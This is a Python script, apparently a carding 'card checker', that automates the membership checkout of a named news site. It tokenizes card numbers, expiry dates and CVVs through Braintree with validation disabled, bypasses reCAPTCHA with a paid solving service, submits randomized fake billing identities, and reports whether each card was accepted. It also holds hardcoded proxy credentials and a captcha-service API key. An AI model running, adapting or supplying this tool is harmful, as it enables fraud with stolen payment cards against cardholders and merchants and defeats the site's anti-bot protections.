import requests
from curl_cffi import requests as crequests
import uuid
import random
import string

proxy_url = "http://tgluifff-US-rotate:c8qjib2luhpt@p.webshare.io:80"

proxies_config = {
    "http": proxy_url,
    "https": proxy_url
}

session = None



def getbecome():
    import re

    url = "https://www.rwcpulse.com/become-a-member/?recurrence=month&summary_template=1+Month+Membership+**Monthly+%2415**%3A+%7B%7BPRICE%7D%7D+%2F+month&price_summary=1+Month+Membership+**Monthly+%2415**%3A+%2415.00+%2F+month&amount=15&referrer=become-a-member&product_type=membership&product_id=14419&currency=USD&action_type=checkout_button&modal_checkout=1&newspack_checkout=1&after_success_button_label=Continue"

    req1 = session.get(url=url)
    html = req1.text

    with open("removecart.html", "w", encoding="utf-8") as f:
        f.write(html)
    print("Html 1 saved")

    match_woo = re.search(r'id="woocommerce-process-checkout-nonce"[^>]*value="([^"]+)"', html)
    match_news = re.search(r'name="newspack_checkout_nonce"[^>]*value="([^"]+)"', html)
    nonce = match_woo.group(1) if match_woo else None
    newspack_nonce = match_news.group(1) if match_news else None

    # Intentar extraer el client token desde el HTML
    bt_client_token = None
    for pattern in [
        r'"clientToken"\s*:\s*"([^"]{50,})"',
        r'"client_token"\s*:\s*"([^"]{50,})"',
        r'clientToken["\s]*:["\s]*["\']([A-Za-z0-9+/=._\-]{50,})["\']',
    ]:
        m = re.search(pattern, html)
        if m:
            bt_client_token = m.group(1)
            break

    # Si no está en el HTML, pedirlo via AJAX (WooCommerce Braintree lo carga así)
    if not bt_client_token:
        m_ct_nonce = re.search(r'"client_token_nonce"\s*:\s*"([^"]+)"', html)
        if m_ct_nonce:
            ct_nonce = m_ct_nonce.group(1)
            print(f"Fetching BT token via AJAX con nonce: {ct_nonce}")
            ajax_url = "https://www.rwcpulse.com/?wc-ajax=wc_braintree_credit_card_get_client_token"
            try:
                ajax_resp = session.post(ajax_url, data={"nonce": ct_nonce})
                ajax_data = ajax_resp.json()
                bt_client_token = (
                    ajax_data.get("data", {}).get("client_token")
                    or ajax_data.get("client_token")
                    or ajax_data.get("data")
                )
                print(f"BT token via AJAX: {'OK' if bt_client_token else 'Vacío'}")
            except Exception as e:
                print(f"Error AJAX BT token: {e}")

    print(f"Nonce WC: {nonce}")
    print(f"Nonce Newspack: {newspack_nonce}")
    print(f"BT Client Token: {'Encontrado' if bt_client_token else 'NO encontrado'}")
    return nonce, newspack_nonce, bt_client_token


def grapqhl(cc, mes, ano, cvv, bt_client_token=None):
    url = "https://payments.braintree-api.com/graphql"

    if not bt_client_token:
        raise Exception("No se pudo obtener el client token de Braintree desde la página. El token hardcodeado venció.")

    headers = {
    'accept': '*/*',
    'accept-language': 'es-US,es-419;q=0.9,es;q=0.8',
    'authorization': f'Bearer {bt_client_token}',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
}

    json = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': str(uuid.uuid4()),
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': cc,
                'expirationMonth': mes,
                'expirationYear': ano,
                'cvv': cvv,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
    }

    req2 = session.post(url=url,headers = headers, json=json, proxies={"http": None, "https": None})
    html = req2.json()
    # Suponiendo que 'respuesta' es tu diccionario de Python
    token = html['data']['tokenizeCreditCard']['token']
    print(token)
    return token
    


def sendtask():
    url = "https://api.capsolver.com/createTask"
    headers={
        "Content-Type": "application/json"


    }
    payload = {
    "clientKey": "CAP-E628130ED40FD0A0BBC180D0C7822D2C3B13D9BAAE3152A7F7A15F473A4F852F",
    "task": {
        "type": "ReCaptchaV2Task",
        "websiteURL": "https://www.rwcpulse.com/checkout/?modal_checkout=1&after_success_button_label=Continue",
        "websiteKey": "6LdlrREqAAAAAHt091Yt9ymllHHPkCfPmrh_NsY9",
        }
    }


    res = requests.post(url=url, json=payload, headers=headers)

    print(res.text)

    data = res.json()
    hashid = data["taskId"]
    print(f"hashid: {hashid}")
    return hashid


import time
api_key = "CAP-E628130ED40FD0A0BBC180D0C7822D2C3B13D9BAAE3152A7F7A15F473A4F852F"  # your api key of capsolver
site_key = "6LdlrREqAAAAAHt091Yt9ymllHHPkCfPmrh_NsY9"  # site key of your target site
site_url = "https://www.rwcpulse.com/checkout/?modal_checkout=1&after_success_button_label=Continue"  # page url of your target site
 

def gettaskresult(taskid):
    url = "https://api.capsolver.com/getTaskResult"
    headers = {
        "Content-Type": "application/json"
    }
    payload = {
        "clientKey": "CAP-E628130ED40FD0A0BBC180D0C7822D2C3B13D9BAAE3152A7F7A15F473A4F852F",
        "taskId": taskid
    }

    while True:
        res = requests.post(url=url, json=payload, headers=headers)
        data = res.json()
        status = data.get("status")
        print(f"Status: {status}")
        if status == "ready":
            token = data["solution"]["gRecaptchaResponse"]
            print(f"Token: ")
            return token
        elif status == "failed":
            print(f"Task failed: {data}")
            return None
        time.sleep(3)



def procesar_datos_tarjeta(cadena_texto):
    try:
        partes = cadena_texto.strip().split('|')
        if len(partes) != 4:
            print("❌ El formato de la tarjeta no es válido. Debe ser numero|mes|año|cvv")
            return None, None, None, None
        numero, mes, ano, cvv = partes
        if len(ano) == 4:
            ano = ano[2:]
        return numero, mes, ano, cvv
    except Exception as e:
        print(f"❌ Error al procesar la línea de la tarjeta: {e}")
        return None, None, None, None


def checkout(token1, nonce1, newspack_nonce, capt):
    from datetime import datetime
    session_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace(" ", "+").replace(":", "%3A")

    first_names = ["James", "Michael", "Robert", "David", "William", "John", "Thomas", "Charles", "Daniel", "Matthew"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Wilson", "Taylor"]
    first = random.choice(first_names)
    last = random.choice(last_names)
    rand_digits = ''.join(random.choices(string.digits, k=4))
    email = f"{first.lower()}{last.lower()}{rand_digits}@gmail.com"
    phone_suffix = ''.join(random.choices(string.digits, k=7))
    phone = f"%2B1616{phone_suffix}"
    street_num = random.randint(10, 999)

    url = "https://www.rwcpulse.com/?wc-ajax=checkout"

    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'es-US,es-419;q=0.9,es;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.rwcpulse.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.rwcpulse.com/checkout/?modal_checkout=1&after_success_button_label=Continue',
    'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }

    data = f'newspack_checkout_nonce={newspack_nonce}&_wp_http_referer=%2Fcheckout%2F%3Fmodal_checkout%3D1%26after_success_button_label%3DContinue&modal_checkout=1&after_success_button_label=Continue&wc_order_attribution_source_type=&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=&wc_order_attribution_utm_source=&wc_order_attribution_utm_medium=&wc_order_attribution_utm_content=&wc_order_attribution_utm_id=&wc_order_attribution_utm_term=&wc_order_attribution_utm_source_platform=&wc_order_attribution_utm_creative_format=&wc_order_attribution_utm_marketing_tactic=&wc_order_attribution_session_entry=https%3A%2F%2Fwww.rwcpulse.com%2F&wc_order_attribution_session_start_time={session_time}&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F149.0.0.0+Safari%2F537.36&billing_first_name={first}&billing_last_name={last}&billing_company=&billing_country=GT&billing_address_1={street_num}+Calle%2C+99&billing_address_2=&billing_city=New+York&billing_state=GT-ES&billing_postcode=10080&billing_phone={phone}&billing_email={email.replace("@", "%40")}&payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=visa&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-cart-contains-subscription=1&wc-braintree-credit-card-3d-secure-order-total=15.00&wc_braintree_credit_card_payment_nonce={token1}&wc_braintree_device_data=&wc-braintree-credit-card-tokenize-payment-method=true&newspack_subscription_confirmation=1&woocommerce-process-checkout-nonce={nonce1}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&g-recaptcha-response={capt}'

    import re
    response = session.post(url=url, headers=headers, data=data)
    print(f"Code: {response.status_code}")
    if response.status_code == 429:
        print("❌ Rate limit (429) - bloqueado por el servidor")
        return "429"
    try:
        data_res = response.json()
        messages_html = data_res.get("messages", "")
        mensaje = re.sub(r"<[^>]+>", "", messages_html).strip()
        print(f"Resultado: {mensaje}")
        return mensaje
    except Exception:
        print(f"Respuesta no JSON: {response.text[:200]}")
        return response.text


# cc = input("Ingresa la tar")
# cc,mes,ano,cvv = procesar_datos_tarjeta(cc)

# nonce1, newspack_nonce = getbecome()
# token1 = grapqhl(cc,mes,ano,cvv)
# taskid = sendtask()
# capt = gettaskresult(taskid)
# time.sleep(3)
# checkout(token1, nonce1, newspack_nonce, capt)


def b3run(cardstring):

    global session
    session = crequests.Session(impersonate="chrome124")
    responsea = session.get("https://api.ipify.org?format=json", timeout=10)
    print(responsea.json())

    cc, mes, ano, cvv = procesar_datos_tarjeta(cardstring)
    nonce1, newspack_nonce, bt_client_token = getbecome()
    token1 = grapqhl(cc, mes, ano, cvv, bt_client_token)
    taskid = sendtask()
    capt = gettaskresult(taskid)
    time.sleep(3)
    response = checkout(token1, nonce1,newspack_nonce, capt)
    return response


def b3runlocal():
    cc = input("Ingresa la tar")
    cc,mes,ano,cvv = procesar_datos_tarjeta(cc)

    nonce1, newspack_nonce = getbecome()
    token1 = grapqhl(cc,mes,ano,cvv)
    taskid = sendtask()
    capt = gettaskresult(taskid)
    time.sleep(3)
    checkout(token1, nonce1, newspack_nonce, capt)


# b3runlocal()



